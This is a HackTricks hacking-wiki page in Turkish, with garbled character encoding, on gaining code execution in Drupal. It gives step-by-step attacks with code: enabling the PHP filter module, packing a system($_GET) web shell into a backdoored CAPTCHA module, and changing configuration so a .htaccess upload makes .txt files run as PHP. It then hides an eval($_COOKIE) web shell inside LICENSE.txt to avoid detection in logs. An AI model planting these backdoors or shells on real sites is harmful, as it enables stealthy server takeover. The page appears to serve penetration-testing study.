# Drupal RCE

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## PHP Filtre ModÃ¼lÃ¼ ile

{% hint style="warning" %}
Eski Drupal sÃ¼rÃ¼mlerinde **(sÃ¼rÃ¼m 8'den Ã¶nce)**, admin olarak giriÅŸ yapmak ve **`PHP filter` modÃ¼lÃ¼nÃ¼ etkinleÅŸtirmek** mÃ¼mkÃ¼ndÃ¼; bu modÃ¼l "GÃ¶mÃ¼lÃ¼ PHP kodu/parÃ§alarÄ±nÄ±n deÄŸerlendirilmesine izin verir." Ancak sÃ¼rÃ¼m 8'den itibaren bu modÃ¼l varsayÄ±lan olarak yÃ¼klenmemektedir.
{% endhint %}

**php eklentisinin yÃ¼klÃ¼ olmasÄ± gerekir** ( _/modules/php_ adresine eriÅŸerek kontrol edin ve eÄŸer **403** dÃ¶nerse, **mevcuttur**, eÄŸer **bulunamazsa**, o zaman **php eklentisi yÃ¼klÃ¼ deÄŸildir**)

_ModÃ¼ller_ -> (**Kontrol Et**) _PHP Filtre_ -> _YapÄ±landÄ±rmayÄ± kaydet_

![](<../../../.gitbook/assets/image (247) (1).png>)

ArdÄ±ndan _Ä°Ã§erik ekle_ -> _Temel Sayfa_ veya _Makale_ seÃ§in -> _gÃ¶vdeye php shellcode yazÄ±n_ -> _Metin formatÄ±nda_ _PHP kodu_ seÃ§in -> _Ã–nizleme_ seÃ§in

![](<../../../.gitbook/assets/image (338).png>)

Son olarak, yeni oluÅŸturulan dÃ¼ÄŸÃ¼me eriÅŸin:
```bash
curl http://drupal-site.local/node/3
```
## PHP Filtre ModÃ¼lÃ¼nÃ¼ Kurun

{% hint style="warning" %}
Mevcut sÃ¼rÃ¼mlerde, varsayÄ±lan kurulumdan sonra yalnÄ±zca web eriÅŸimi ile eklenti kurmak artÄ±k mÃ¼mkÃ¼n deÄŸildir.
{% endhint %}

**8 ve sonrasÄ± sÃ¼rÃ¼mlerde,** [**PHP Filtre**](https://www.drupal.org/project/php/releases/8.x-1.1) **modÃ¼lÃ¼ varsayÄ±lan olarak kurulmamÄ±ÅŸtÄ±r**. Bu iÅŸlevselliÄŸi kullanmak iÃ§in **modÃ¼lÃ¼ kendimiz kurmamÄ±z gerekecek**.

1. ModÃ¼lÃ¼n en son sÃ¼rÃ¼mÃ¼nÃ¼ Drupal web sitesinden indirin.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Ä°ndirdikten sonra **`YÃ¶netim`** > **`Raporlar`** > **`Mevcut gÃ¼ncellemeler`** bÃ¶lÃ¼mÃ¼ne gidin.
3. **`GÃ¶zat`** butonuna tÄ±klayÄ±n, indirdiÄŸimiz dosyayÄ± seÃ§in ve ardÄ±ndan **`Kur`** butonuna tÄ±klayÄ±n.
4. ModÃ¼l kurulduktan sonra, **`Ä°Ã§erik`** butonuna tÄ±klayÄ±p **yeni bir temel sayfa oluÅŸturabiliriz**, Drupal 7 Ã¶rneÄŸinde yaptÄ±ÄŸÄ±mÄ±z gibi. Yine, **`Metin biÃ§imi`** aÃ§Ä±lÄ±r menÃ¼sÃ¼nden **`PHP kodu`nu seÃ§tiÄŸinizden emin olun**.

## Arka KapÄ±lÄ± ModÃ¼l

{% hint style="warning" %}
Mevcut sÃ¼rÃ¼mlerde, varsayÄ±lan kurulumdan sonra yalnÄ±zca web eriÅŸimi ile eklenti kurmak artÄ±k mÃ¼mkÃ¼n deÄŸildir.
{% endhint %}

Arka kapÄ±lÄ± bir modÃ¼l, **mevcut bir modÃ¼le bir shell ekleyerek** oluÅŸturulabilir. ModÃ¼ller drupal.org web sitesinde bulunabilir. [CAPTCHA](https://www.drupal.org/project/captcha) gibi bir modÃ¼l seÃ§elim. AÅŸaÄŸÄ± kaydÄ±rÄ±n ve tar.gz [arÅŸivinin](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) baÄŸlantÄ±sÄ±nÄ± kopyalayÄ±n.

* ArÅŸivi indirin ve iÃ§eriÄŸini Ã§Ä±karÄ±n.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* AÅŸaÄŸÄ±daki iÃ§erik ile bir **PHP web shell** oluÅŸturun:
```php
<?php
system($_GET["cmd"]);
?>
```
* Sonra, kendimize klasÃ¶re eriÅŸim saÄŸlamak iÃ§in bir **`.htaccess`** dosyasÄ± oluÅŸturmamÄ±z gerekiyor. Bu, Drupal'Ä±n **`/modules`** klasÃ¶rÃ¼ne doÄŸrudan eriÅŸimi reddetmesi nedeniyle gereklidir.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* YukarÄ±daki yapÄ±landÄ±rma, /modules iÃ§inde bir dosya talep ettiÄŸimizde / klasÃ¶rÃ¼ iÃ§in kurallarÄ± uygulayacaktÄ±r. Bu iki dosyayÄ± captcha klasÃ¶rÃ¼ne kopyalayÄ±n ve bir arÅŸiv oluÅŸturun.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Web sitesine **yÃ¶netici eriÅŸimimiz** olduÄŸunu varsayarsak, yan menÃ¼de **`YÃ¶net`** ve ardÄ±ndan **`GeniÅŸlet`** seÃ§eneÄŸine tÄ±klayÄ±n. Sonra, **`+ Yeni modÃ¼l yÃ¼kle`** butonuna tÄ±klayÄ±n ve bizi yÃ¼kleme sayfasÄ±na yÃ¶nlendirecek, Ã¶rneÄŸin `http://drupal-site.local/admin/modules/install` Backdoor'lu Captcha arÅŸivine gidin ve **`YÃ¼kle`** butonuna tÄ±klayÄ±n.
* YÃ¼kleme baÅŸarÄ±lÄ± olduktan sonra, komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in **`/modules/captcha/shell.php`** adresine gidin.

## Drupal'Ä± KonfigÃ¼rasyon senkronizasyonu ile Backdoor'lama <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**PaylaÅŸan:** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### BÃ¶lÃ¼m 1 (_Media_ ve _Media Library_ aktivasyonu)

_GeniÅŸlet_ menÃ¼sÃ¼nde (/admin/modules), zaten yÃ¼klenmiÅŸ gibi gÃ¶rÃ¼nen eklentileri etkinleÅŸtirebilirsiniz. VarsayÄ±lan olarak, _Media_ ve _Media Library_ eklentileri etkin gÃ¶rÃ¼nmÃ¼yor, bu yÃ¼zden bunlarÄ± etkinleÅŸtirelim.

Aktivasyondan Ã¶nce:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Aktivasyondan sonra:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### BÃ¶lÃ¼m 2 (_Configuration synchronization_ Ã¶zelliÄŸinden yararlanma) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Drupal konfigÃ¼rasyon giriÅŸlerini dÃ¶kme (ihracat) ve yÃ¼kleme (ithalat) iÃ§in _Configuration synchronization_ Ã¶zelliÄŸinden yararlanacaÄŸÄ±z:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

Ä°lk giriÅŸ olan `allow_insecure_uploads`'Ä± ÅŸu ÅŸekilde yamanlayarak baÅŸlayalÄ±m:

Dosya: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Åuna:

Dosya: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field\_media\_document.yml**

Sonra, ikinci giriÅŸi `file_extensions`'dan ÅŸu ÅŸekilde yamanÄ±z gerekiyor:

File: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Åuna:

Dosya: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Bu blog yazÄ±sÄ±nda kullanmÄ±yorum ama `file_directory` giriÅŸinin keyfi bir ÅŸekilde tanÄ±mlanabileceÄŸi ve bir yol geÃ§iÅŸi saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z olduÄŸu not edilmiÅŸtir (bu nedenle Drupal dosya sistemi aÄŸacÄ±nda yukarÄ± geri gidebiliriz).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### BÃ¶lÃ¼m 3 (Ã¶zellik _Belge Ekle_ kullanÄ±mÄ±) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

Son adÄ±m en basit olanÄ±dÄ±r ve iki alt adÄ±ma ayrÄ±lmÄ±ÅŸtÄ±r. Ä°lk adÄ±m, Apache direktiflerinden yararlanmak ve .txt dosyalarÄ±nÄ±n PHP motoru tarafÄ±ndan yorumlanmasÄ±na izin vermek iÃ§in bir .htaccess formatÄ±nda dosya yÃ¼klemektir. Ä°kinci adÄ±m, yÃ¼kleyeceÄŸimiz yÃ¼kÃ¼ iÃ§eren bir .txt dosyasÄ±dÄ±r.

Dosya: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Neden bu hile havalÄ±?

Ã‡Ã¼nkÃ¼ Webshell (biz buna LICENSE.txt diyeceÄŸiz) Web sunucusuna yÃ¼klendikten sonra, komutlarÄ±mÄ±zÄ± `$_COOKIE` aracÄ±lÄ±ÄŸÄ±yla iletebiliriz ve bu, Web sunucusu gÃ¼nlÃ¼klerinde, bir metin dosyasÄ±na yapÄ±lan meÅŸru bir GET isteÄŸi olarak gÃ¶rÃ¼necektir.

Neden Webshell'imize LICENSE.txt adÄ±nÄ± veriyoruz?

BasitÃ§e, Ã¶rneÄŸin [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) dosyasÄ±nÄ± alÄ±rsak (ki bu dosya Drupal Ã§ekirdeÄŸinde zaten mevcut), 339 satÄ±r ve 17.6 KB boyutunda bir dosyamÄ±z var, bu da ortasÄ±na kÃ¼Ã§Ã¼k bir PHP kodu eklemek iÃ§in mÃ¼kemmel (Ã§Ã¼nkÃ¼ dosya yeterince bÃ¼yÃ¼k). 

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Dosya: YamanmÄ±ÅŸ LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **BÃ¶lÃ¼m 3.1 (dosya yÃ¼kle .htaccess)**

Ã–ncelikle, Apache direktiflerini iÃ§eren dosyamÄ±zÄ± yÃ¼klemek iÃ§in _Belge Ekle_ (/media/add/document) Ã¶zelliÄŸini kullanÄ±yoruz (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**BÃ¶lÃ¼m 3.2 (dosya yÃ¼kle LICENSE.txt)**

Daha sonra, bir lisans dosyasÄ± iÃ§inde gizlenmiÅŸ bir Webshell yÃ¼klemek iÃ§in tekrar _Belge Ekle_ (/media/add/document) Ã¶zelliÄŸini kullanÄ±yoruz.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### BÃ¶lÃ¼m 4 (Webshell ile etkileÅŸim) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Son bÃ¶lÃ¼m, Webshell ile etkileÅŸimde bulunmaktan oluÅŸmaktadÄ±r.

AÅŸaÄŸÄ±daki ekran gÃ¶rÃ¼ntÃ¼sÃ¼nde gÃ¶sterildiÄŸi gibi, Webshell'imiz tarafÄ±ndan beklenen Ã§erez tanÄ±mlÄ± deÄŸilse, bir Web tarayÄ±cÄ±sÄ± aracÄ±lÄ±ÄŸÄ±yla dosyayÄ± sorguladÄ±ÄŸÄ±mÄ±zda aÅŸaÄŸÄ±daki sonucu alÄ±rÄ±z.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

SaldÄ±rgan Ã§erezi ayarladÄ±ÄŸÄ±nda, Webshell ile etkileÅŸimde bulunabilir ve istediÄŸi herhangi bir komutu Ã§alÄ±ÅŸtÄ±rabilir.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Ve loglarda gÃ¶rebileceÄŸiniz gibi, yalnÄ±zca bir txt dosyasÄ±nÄ±n talep edildiÄŸi gÃ¶rÃ¼nmektedir.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Bu makaleyi okumak iÃ§in zaman ayÄ±rdÄ±ÄŸÄ±nÄ±z iÃ§in teÅŸekkÃ¼r ederim, umarÄ±m size bazÄ± shell'ler elde etmede yardÄ±mcÄ± olur.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
